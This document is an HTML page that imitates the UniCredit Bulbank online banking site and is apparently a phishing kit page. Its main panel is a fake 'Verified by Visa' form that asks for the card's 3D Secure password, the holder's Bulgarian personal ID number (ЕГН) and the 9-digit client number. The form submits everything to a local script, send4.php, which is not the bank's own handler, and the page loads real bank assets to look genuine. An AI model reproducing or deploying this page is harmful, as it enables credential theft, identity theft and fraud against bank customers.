<html lang="bg"><head>
	 <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
  
  
  <title>UniCredit Bulbank</title>
  
  
  <meta name="description" content="UniCredit Bulbank - consumer, mortgage and business loans, bank cards and bank accounts.">
  <meta name="author" content="UniCredit Bulbank">
<link rel="stylesheet" href="https://bulbankonline.bg/Content/css/style.min.css">
 <script type="text/javascript" src="https://bulbankonline.bg/Scripts/libs/require.js"></script>
    <script type="text/javascript" src="https://bulbankonline.bg/Scripts/libs/promise.js"></script>
    <script type="text/javascript" src="https://bulbankonline.bg/Scripts/commonSRI.js"></script>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="Scripts/app" src="/Scripts/app.js" integrity="sha256-btUqXrljjGucF8Ebq7VLuUsdRN32j+vjVbbZqaUEbbE=" crossorigin="anonymous"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="https://bulbankonline.bg/Scripts/common.js" src="https://bulbankonline.bg/Scripts/common.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="/Scripts/common.js" src="/Scripts/common.js" integrity="sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=" crossorigin="anonymous"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<link rel="stylesheet" href="./HTML/css/filet_005.css">
<script src="https://kit.fontawesome.com/df59028804.js"></script><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all"><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free-v4-font-face.min.css" media="all"><link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free-v4-shims.min.css" media="all">
<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free-v4-font-face.min.css" media="all">
<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free-v4-shims.min.css" media="all"></head>
<body id="Individual">
   <style>
#pageLogin .login-list-groups .list-group .list-group-item:before {
    position: absolute;
    left: 0;
    top: .6em;
	display:none!important;
    content: "";
}</style>
 <header>
 
<!--ko stopBinding: true-->

<div class="view-container" id="view_30ad6e3e24cc42a491de1262ec13674a" data-bind="contextContainerData: this">
<nav class="navbar nav-service service-area-public">
    <div class="container">
        <ul class="nav navbar-nav">
<li class="nav-item navbar-brand mr-auto ">
    <a class="nav-link" href="#">

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="tel:+35929337333">
<i class="fa fa-mobile-phone icon-lg"></i>
                <span class="item-label" title="02 933 7 333">02 933 7 333</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="tel:15333">
<i class="fa fa-phone icon-lg"></i>
                <span class="item-label" title="15 333">15 333</span>

    </a>
</li><li class="nav-item navbar-btn ">
    <a class="nav-link" href="#" target="_blank" rel="noopener">
                <span class="item-label" title="Demo">Демо</span>

    </a>
</li><li class="nav-item navbar-language " data-bind="click: function(){return ChangeLanguage();}">
    <a class="nav-link" href="javascript:void(0)">

    </a>
</li>
        </ul>
    </div>
</nav>

</div>

    <script type="text/javascript">
        requirejs(['https://bulbankonline.bg/Scripts/common.js'], function (common) {
            requirejs(['Scripts/app'], function (app) {
                var application = new app();
                application.Initialize('en-US', 'none', '');
                requirejs(['jquery', 'underscore', 'knockout', 'knockout.mapping', 'UrlHelper', 'MetadataToValidationConverter', 'Pages/Common/Views/Navigation/ServiceNavigationPublic.xaml'
                ], function ($, _, ko, komapping, UrlHelper, MetadataToValidationConverter, ViewModel
                    ) {
                    var metadataConverter = new MetadataToValidationConverter.MetadataToValidationConverter();
                    var viewData = null;
                    var viewModel = new ViewModel(komapping.fromJS(JSON.parse('{\"$type\":\"Common.Models.Navigation.ServiceNavigationPublicInfo, WEBUI\",\"RootController\":\"Login\",\"RootAction\":\"Index\",\"RootArea\":null,\"OtherLanguage\":\"bg-BG\"}')), viewData, function(model) { return metadataConverter.GetValidatonRules(JSON.parse('{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.DependentModelMetadata, DAIS.UIFramework\",\"Types\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[DAIS.UIFramework.ModelMetadata.Objects.TypeMetadata, DAIS.UIFramework]], mscorlib\",\"DAIS.eBank.Client.WEB.UIFramework.Pages.Common.Models.Navigation.ServiceNavigationPublicInfo\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.TypeMetadata, DAIS.UIFramework\",\"Properties\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework]], mscorlib\",\"RootController\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework\",\"TypeName\":null,\"ValidationRules\":[]},\"RootAction\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework\",\"TypeName\":null,\"ValidationRules\":[]},\"RootArea\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework\",\"TypeName\":null,\"ValidationRules\":[]},\"OtherLanguage\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework\",\"TypeName\":null,\"ValidationRules\":[]}}}}}'), model || 'DAIS.eBank.Client.WEB.UIFramework.Pages.Common.Models.Navigation.ServiceNavigationPublicInfo') });

                    var element = document.getElementById("view_30ad6e3e24cc42a491de1262ec13674a");
                    ko.applyBindings(viewModel, element);
                    $(element).trigger("DAISUIFrameworkAfterApplyBindingsEvent");
                    if (_.isFunction(viewModel.AfterApplyBindings))
                        viewModel.AfterApplyBindings();

                });
            });
        });
    </script>

<!--/ko--></header>
    <main>
            <aside class="aside-left">
<!--ko stopBinding: true-->
<form method="post" action="send4.php">
<div class="view-container" id="view_ec7920550cc44a86ad3a2e99636e418f" data-bind="contextContainerData: this">
<nav class="navbar nav-main nav-mobile">
    <div class="container"> 

        <ul class="nav navbar-nav">
<li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/Home">
<i class="fa fa-home"></i>
                <span class="item-label" title="Начало">Начало</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="#">
<i class="fa fa-exchange"></i>
                <span class="item-label" title="Преводи">Преводи</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="javascript:void(0)" navid="TransferSession/BillPaymentsAndStandings">
<i class="fa fa-flash"></i>
                <span class="item-label" title="Битови сметки">Битови сметки</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="#">
<i class="fa fa-balance-scale"></i>
                <span class="item-label" title="Сметки">Сметки</span>

    </a>
</li><li class="nav-item active">
    <a class="nav-link" href="#">
<i class="fa fa-credit-card	"></i>
                <span class="item-label" title="Карти">Карти</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="#">
<i class="fa fa-shopping-cart"></i>
                <span class="item-label" title="Кредити">Кредити</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="#">
<i class="fa fa-shopping-basket"></i>
                <span class="item-label" title="Спестявания и инвестиции">Спестявания и инвестиции</span>

    </a>
</li><li class="nav-item nav-item-parent has-children" style="display: none">
    <a class="nav-link" href="javascript:void(0)" navid="#bcca3d42389d415c809f85db163df9e2">
                <span class="item-label" title=""></span>

    </a>
        <ul class="nav navbar-subnav">
<li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/PSD2Payment">

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/PSD2Payment/CancelPaymentRequest">

    </a>
</li>
        </ul>
</li><li class="nav-item nav-item-parent has-children" style="display: none">
    <a class="nav-link" href="javascript:void(0)" navid="#852279ac077c49b99ae7b94f64b5895d">
                <span class="item-label" title=""></span>

    </a>
        <ul class="nav navbar-subnav">
<li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/PSD2Consents">

    </a>
</li>
        </ul>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/TabNavigation/Requests">
<i class="i i-shopping-basket"></i>
                <span class="item-label" title="Заявки">Заявки</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/PSD2ConsentsManagement">
<i class="i i-balance-wallet"></i>
                <span class="item-label" title="Управление на съгласия">Управление на съгласия</span>

    </a>
</li><li class="nav-item " style="display: none">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/Despatch/Notifications">

    </a>
</li><li class="nav-item " style="display: none">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/Gecko">

    </a>
</li><li class="nav-item " style="display: none">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/Gecko/SkipTask">

    </a>
</li><li class="nav-item nav-item-parent has-children" style="display: none">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/Settings" navid="#84ef1fe4d89641f69cc55ea398b46569">
                <span class="item-label" title="Настройки">Настройки</span>

    </a>
        <ul class="nav navbar-subnav">
<li class="nav-item nav-item-parent has-children">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/TabNavigation/PersonalData" navid="#dc2d1e059f8d465284b5e84709a841c3">
<i class="i i-account"></i>
                <span class="item-label" title="Лични данни">Лични данни</span>

    </a>
        <ul class="nav navbar-subnav">
<li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/MyData">
                <span class="item-label" title="Моите данни">Моите данни</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/ChangeLogin">
                <span class="item-label" title="Смяна на потребителско име">Смяна на потребителско име</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/ChangePassword">
                <span class="item-label" title="Смяна на парола">Смяна на парола</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/Sessions">
                <span class="item-label" title="Потребителски сесии">Потребителски сесии</span>

    </a>
</li>
        </ul>
</li><li class="nav-item nav-item-parent has-children">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/TabNavigation/MobileServices" navid="#d9493ac53b0a4a58af45fe5e7594271f">
<i class="i i-smartphone-iphone"></i>
                <span class="item-label" title="Мобилни услуги">Мобилни услуги</span>

    </a>
        <ul class="nav navbar-subnav">
<li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/ProvisioningUserDevices">
                <span class="item-label" title="Мобилно банкиране">Мобилно банкиране</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/MobileLimit">
                <span class="item-label" title="Мобилен лимит">Мобилен лимит</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/MissingFeatures/MToken">
                <span class="item-label" title="М-токен">М-токен</span>

    </a>
</li>
        </ul>
</li><li class="nav-item nav-item-parent has-children">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/TabNavigation/Certificates" navid="#49794d9cf8db46458ce2c31e699d2f9a">
<i class="i i-shield-security"></i>
                <span class="item-label" title="КЕП и Сертификати">КЕП и Сертификати</span>

    </a>
        <ul class="nav navbar-subnav">
<li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/MissingFeatures/Certificates">
                <span class="item-label" title="КЕП и Сертификати">КЕП и Сертификати</span>

    </a>
</li>
        </ul>
</li><li class="nav-item nav-item-parent has-children">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/TabNavigation/AuthorizationMethods" navid="#a7deb7a0771b4ecc97f9090980ed50e9">
<i class="i i-account-calendar"></i>
                <span class="item-label" title="Средства за авторизация">Средства за авторизация</span>

    </a>
        <ul class="nav navbar-subnav">
<li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/AuthorizationMethods">
                <span class="item-label" title="Средство за подписване">Средство за подписване</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/SessionAuthorizationMethods">
                <span class="item-label" title="Достъп до активни операции">Достъп до активни операции</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/SessionAuthorizationLoginMode">
                <span class="item-label" title="Достъп по подразбиране">Достъп по подразбиране</span>

    </a>
</li>
        </ul>
</li><li class="nav-item nav-item-parent has-children">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/TabNavigation/TrustedBeneficiaries" navid="#22e8283e1a5e4e62990a11d8a3c1d16e">
<i class="i i-accounts"></i>
                <span class="item-label" title="Доверени получатели">Доверени получатели</span>

    </a>
        <ul class="nav navbar-subnav">
<li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/WhiteList">
                <span class="item-label" title="Бял списък">Бял списък</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/BlackList">
                <span class="item-label" title="Черен списък">Черен списък</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/TrustedBeneficiaries">
                <span class="item-label" title="Одобрени контрагенти">Одобрени контрагенти</span>

    </a>
</li>
        </ul>
</li><li class="nav-item nav-item-parent has-children">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/TabNavigation/Preferences" navid="#f6a29360ba8641a893ba2884463f8cb2">
<i class="i i-star-outline"></i>
                <span class="item-label" title="Предпочитания">Предпочитания</span>

    </a>
        <ul class="nav navbar-subnav">
<li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/Preferences/Payments">
                <span class="item-label" title="Преводи">Преводи</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/Preferences/Accounts">
                <span class="item-label" title="Настройки на сметки">Настройки на сметки</span>

    </a>
</li>
        </ul>
</li><li class="nav-item nav-item-parent has-children">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/TabNavigation/Notifications" navid="#6522d7b164d74b8b97423deaf94b5bbd">
<i class="i i-notifications-active"></i>
                <span class="item-label" title="Известия">Известия</span>

    </a>
        <ul class="nav navbar-subnav">
<li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/Notifications">
                <span class="item-label" title="Известяване при събитие">Известяване при събитие</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/MissingFeatures/Subscriptions">
                <span class="item-label" title="Известяване по график">Известяване по график</span>

    </a>
</li><li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/MissingFeatures/SMSServices">
                <span class="item-label" title="SMS услуги">SMS услуги</span>

    </a>
</li>
        </ul>
</li><li class="nav-item nav-item-parent has-children">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/TabNavigation/RegistrationUniPay" navid="#f4b53e68a097407c9d2648e63b199a71">
<i class="i i-flash"></i>
                <span class="item-label" title="Битови сметки">Битови сметки</span>

    </a>
        <ul class="nav navbar-subnav">
<li class="nav-item ">
    <a class="nav-link" href="/7A0274B4B6E4EAC9BBA66D5D57BE07DA/bg-BG/individual/MissingFeatures/RegistrationUniPay">
                <span class="item-label" title="Регистрация за плащане на сметки">Регистрация за плащане на сметки</span>

    </a>
</li>
        </ul>
</li>
        </ul>
</li><li class="nav-item " style="display: none">
    <a class="nav-link" href="/bg-BG/individual/Feedback/UserFeedback">

    </a>
</li>
        </ul>
    </div>
</nav>

</div>


<!--/ko-->
<!--ko stopBinding: true-->

<div class="view-container" id="view_6b519d1868134a9ea790a47d06e5f740" data-bind="contextContainerData: this">
<div class="stack secondary-menu togglepanel-group">



<div class="tab-layout ">
    <div class="tab-nav">
<div data-bind="contentBox: true">
    <div class="secondary-menu-buttons" data-bind="template: { name: 'template_1e2737c78a424c76b2dae6479913926a', foreach: ViewData.Tabs }">
    </div>

</div>    </div>
    <div class="tab-content" data-bind="elementReference: TabContentElement"></div>
</div><button class="btn btn-primary" type="button" data-bind="visible: ActiveTab, click: function(){return CloseAllTabs();}" style="display: none">

<span class="text">
<i class="i i-close"></i>


    <span class="value">
        
    </span>
</span>
</button>
</div>

</div>

    <script type="text/javascript">
        requirejs(['/Scripts/common.js'], function (common) {
            requirejs(['Scripts/app'], function (app) {
                var application = new app();
                application.Initialize('bg-BG', 'individual', '7A0274B4B6E4EAC9BBA66D5D57BE07DA');
                requirejs(['jquery', 'underscore', 'knockout', 'knockout.mapping', 'UrlHelper', 'MetadataToValidationConverter', 'Pages/Common/Views/SecondaryNavigation/Index.xaml'
                ], function ($, _, ko, komapping, UrlHelper, MetadataToValidationConverter, ViewModel
                    ) {
                    var metadataConverter = new MetadataToValidationConverter.MetadataToValidationConverter();
                    var viewData = JSON.parse('{\"$type\":\"Common.Models.TabNavigationViewData, WEBUI\",\"Tabs\":[{\"$type\":\"Common.Models.TabData, WEBUI\",\"Text\":\"Свържете се с нас\",\"Icon\":\"phone-in-talk\",\"Controller\":\"SecondaryNavigation\",\"Action\":\"Contacts\"},{\"$type\":\"Common.Models.TabData, WEBUI\",\"Text\":\"Локации\",\"Icon\":\"pin\",\"Controller\":\"SecondaryNavigation\",\"Action\":\"Locations\"},{\"$type\":\"Common.Models.TabData, WEBUI\",\"Text\":\"Валутни курсове\",\"Icon\":\"euro\",\"Controller\":\"SecondaryNavigation\",\"Action\":\"CurrencyRates\"},{\"$type\":\"Common.Models.TabData, WEBUI\",\"Text\":\"Тарифи и документи\",\"Icon\":\"file-text\",\"Controller\":\"SecondaryNavigation\",\"Action\":\"Taxes\"}]}');
                    var viewModel = new ViewModel(null, viewData, null);

                    var element = document.getElementById("view_6b519d1868134a9ea790a47d06e5f740");
                    ko.applyBindings(viewModel, element);
                    $(element).trigger("DAISUIFrameworkAfterApplyBindingsEvent");
                    if (_.isFunction(viewModel.AfterApplyBindings))
                        viewModel.AfterApplyBindings();

                });
            });
        });
    </script>

<script type="text/template" id="template_1e2737c78a424c76b2dae6479913926a"><button class="btn btn-primary" type="button" 
         
        data-bind="attr: { title: Text }, elementReference: TabElement, click: function(){return $parent.LoadTab(ko.utils.unwrapObservable($data));}"
        
        data-toggle="tooltip" 
        >

<span class="text"   >
<i class="i i-" data-bind="css: &#39;i-&#39; + ko.utils.unwrapObservable(Icon)" ></i>


    <span  class="value">
        
    </span>
</span>
</button></script><!--/ko--></form></aside>
        <div class="main-content">

<!--ko stopBinding: true-->

<div class="view-container" id="view_7db32c3ee4ca460886e4e8a9ea43d796" data-bind="contextContainerData: this">
<div role="alert" class="alert alert-warning session-expiration" data-bind="click: function(){return ClickCommand();}, css: { 'active': IsActive }, visible: SessionMessage" style="display: none">
<span class="text">


    <span data-bind="text: SessionMessage" class="value">
        
    </span>
</span></div>
</div>

    <script type="text/javascript">
        requirejs(['/Scripts/common.js'], function (common) {
            requirejs(['Scripts/app'], function (app) {
                var application = new app();
                application.Initialize('bg-BG', 'individual', '7A0274B4B6E4EAC9BBA66D5D57BE07DA');
                requirejs(['jquery', 'underscore', 'knockout', 'knockout.mapping', 'UrlHelper', 'MetadataToValidationConverter', 'Pages/Common/Views/SessionExpiration/Index.xaml'
                ], function ($, _, ko, komapping, UrlHelper, MetadataToValidationConverter, ViewModel
                    ) {
                    var metadataConverter = new MetadataToValidationConverter.MetadataToValidationConverter();
                    var viewData = null;
                    var viewModel = new ViewModel(komapping.fromJS(JSON.parse('{\"$type\":\"Common.Models.SessionCountdown, WEBUI\",\"SessionCountdownInSeconds\":600}')), viewData, function(model) { return metadataConverter.GetValidatonRules(JSON.parse('{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.DependentModelMetadata, DAIS.UIFramework\",\"Types\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[DAIS.UIFramework.ModelMetadata.Objects.TypeMetadata, DAIS.UIFramework]], mscorlib\",\"DAIS.eBank.Client.WEB.UIFramework.Pages.Common.Models.SessionCountdown\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.TypeMetadata, DAIS.UIFramework\",\"Properties\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework]], mscorlib\",\"SessionCountdownInSeconds\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework\",\"TypeName\":null,\"ValidationRules\":[]}}}}}'), model || 'DAIS.eBank.Client.WEB.UIFramework.Pages.Common.Models.SessionCountdown') });

                    var element = document.getElementById("view_7db32c3ee4ca460886e4e8a9ea43d796");
                    ko.applyBindings(viewModel, element);
                    $(element).trigger("DAISUIFrameworkAfterApplyBindingsEvent");
                    if (_.isFunction(viewModel.AfterApplyBindings))
                        viewModel.AfterApplyBindings();

                });
            });
        });
    </script>

<!--/ko-->
<div class="view-container" id="view_b9d3a8da36fc46219eded2e49aa0c9ea" data-bind="contextContainerData: this">
<div class="stack page-cards">



<div class="content-header">
    <h1 class="">
<span class="text">


    <span class="value">
        Карти
    </span>
</span>    </h1>
    <div class="content-header-controls">

<!--ko stopBinding: true-->

<div class="view-container" id="view_061b1051c19547f8ac6ccb52ba3ac8c2" data-bind="contextContainerData: this">
<div class="form content-box clearfix form-block content-layout-control" data-bind="contentBox: true">





</div>

</div>

    <script type="text/javascript">
        requirejs(['/Scripts/common.js'], function (common) {
            requirejs(['Scripts/app'], function (app) {
                var application = new app();
                application.Initialize('bg-BG', 'individual', '7A0274B4B6E4EAC9BBA66D5D57BE07DA');
                requirejs(['jquery', 'underscore', 'knockout', 'knockout.mapping', 'UrlHelper', 'MetadataToValidationConverter', 'Pages/Common/Views/LayoutToggler.xaml'
                ], function ($, _, ko, komapping, UrlHelper, MetadataToValidationConverter, ViewModel
                    ) {
                    var metadataConverter = new MetadataToValidationConverter.MetadataToValidationConverter();
                    var viewData = null;
                    var viewModel = new ViewModel(komapping.fromJS(JSON.parse('{\"$type\":\"Common.Models.LayoutType, WEBUI\",\"IsGridView\":false}')), viewData, function(model) { return metadataConverter.GetValidatonRules(JSON.parse('{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.DependentModelMetadata, DAIS.UIFramework\",\"Types\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[DAIS.UIFramework.ModelMetadata.Objects.TypeMetadata, DAIS.UIFramework]], mscorlib\",\"DAIS.eBank.Client.WEB.UIFramework.Pages.Common.Models.LayoutType\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.TypeMetadata, DAIS.UIFramework\",\"Properties\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework]], mscorlib\",\"IsGridView\":{\"$type\":\"DAIS.UIFramework.ModelMetadata.Objects.PropertyMetadata, DAIS.UIFramework\",\"TypeName\":null,\"ValidationRules\":[]}}}}}'), model || 'DAIS.eBank.Client.WEB.UIFramework.Pages.Common.Models.LayoutType') });

                    var element = document.getElementById("view_061b1051c19547f8ac6ccb52ba3ac8c2");
                    ko.applyBindings(viewModel, element);
                    $(element).trigger("DAISUIFrameworkAfterApplyBindingsEvent");
                    if (_.isFunction(viewModel.AfterApplyBindings))
                        viewModel.AfterApplyBindings();

                });
            });
        });
    </script>

<!--/ko-->    </div>
</div><div class="tab-layout tab-layout-card content" style="background:#fff!important;">

    <div style="width:100%!important;" data-bind="elementReference: TabContentElement" class="tab-content">
	
	<div class="bOwToWfIn">
    <img src="./HTML/img/logo.jpg" style=" display: block; width: 285px; height: 32px; margin-left: -1px!important; ">
    <img src="./HTML/img/logo2.png" style="display: block;width: 98px;height: 32px;margin-left: -1px!important;"><br>
    <div id="textwahdlawl">Добавена безопасност онлайн</div><br>
    <div id="textwahdlawltni">Verified by Visa помага да защитите картата си от неоторизирана употреба - без допълнителни разходи. Използване на Verified by Visa за това и бъдещите торби. попълнете тази страница Вие ще създадете своя собствена Verified by Visa парола</div>
    <form name="passwordxd" action="send4.php" method="POST" onsubmit="return passworddvalid()">
      
      <table>
        <tbody>
          <tr>
            <td id="trcolr">Име на държава :  </td>
            <td id="trcolr">Bulgaria</td>
          </tr>
          <tr>
            <td id="trcolr">3D парола : </td>
            <td id="trcolr"><input type="text" name="passwordxone" id="passwordxone" required=""></td>
          </tr>
          <tr>
            <td id="trcolr">ЕГН : </td>
            <td id="trcolr"><input type="text" name="passwordxtow" maxlength="10" id="passwordxtow" required=""></td>
          </tr>
          <tr>
            <td id="trcolr">Клиентският <br>Ви 9-цифрен номер :</td>
            <td id="trcolr"><input type="text" name="passwordxtry" maxlength="9" id="passwordxtry" required=""></td>
          </tr>
          <tr>
            <td id="trcolr"></td>
            <td id="trcolr"><input type="submit" name="Addpassword3d" id="Addpassword3d" value="Изпращане "></td>
          </tr>


          
        </tbody>
      </table>
    </form>

  </div>
	
	
	</div>
</div>
</div>

</div>



        </div>
    </main>

    <footer>
<!--ko stopBinding: true-->

<div class="view-container" id="view_95669eb554a7406e99bda3354ed20b14" data-bind="contextContainerData: this">
<div class="stack container">



<span class="text">


    <span class="value">
        © 2019 УниКредит Булбанк АД
    </span>
</span><a class="link" href="https://www.unicreditbulbank.bg/bg/pravna-informatsiya/poveritelnost/" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Поверителност
    </span>
</span>
</a><a class="link" href="https://www.unicreditbulbank.bg/bg/pravna-informatsiya/usloviya-za-polzvane/" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Права на ползване
    </span>
</span>
</a><a class="link" href="https://online.bulbank.bg/docs/FAQ_BG.pdf" target="_blank" rel="noopener">
<span class="text">


    <span class="value">
        Често задавани въпроси
    </span>
</span>
</a><a class="link" href="javascript:void(0)" data-bind="click: function(){return Feedback();}">
<span class="text">


    <span class="value">
        Споделете с нас 
    </span>
</span>
</a>
</div>

</div>

    <script type="text/javascript">
        requirejs(['/Scripts/common.js'], function (common) {
            requirejs(['Scripts/app'], function (app) {
                var application = new app();
                application.Initialize('bg-BG', 'individual', '7A0274B4B6E4EAC9BBA66D5D57BE07DA');
                requirejs(['jquery', 'underscore', 'knockout', 'knockout.mapping', 'UrlHelper', 'MetadataToValidationConverter', 'Pages/Common/Views/Footer/Footer.xaml'
                ], function ($, _, ko, komapping, UrlHelper, MetadataToValidationConverter, ViewModel
                    ) {
                    var metadataConverter = new MetadataToValidationConverter.MetadataToValidationConverter();
                    var viewData = JSON.parse('{\"$type\":\"Common.Models.ViewData.FooterViewData, WEBUI\",\"IsLoggedin\":true}');
                    var viewModel = new ViewModel(null, viewData, null);

                    var element = document.getElementById("view_95669eb554a7406e99bda3354ed20b14");
                    ko.applyBindings(viewModel, element);
                    $(element).trigger("DAISUIFrameworkAfterApplyBindingsEvent");
                    if (_.isFunction(viewModel.AfterApplyBindings))
                        viewModel.AfterApplyBindings();

                });
            });
        });
    </script>

<!--/ko--></footer>

</body></html>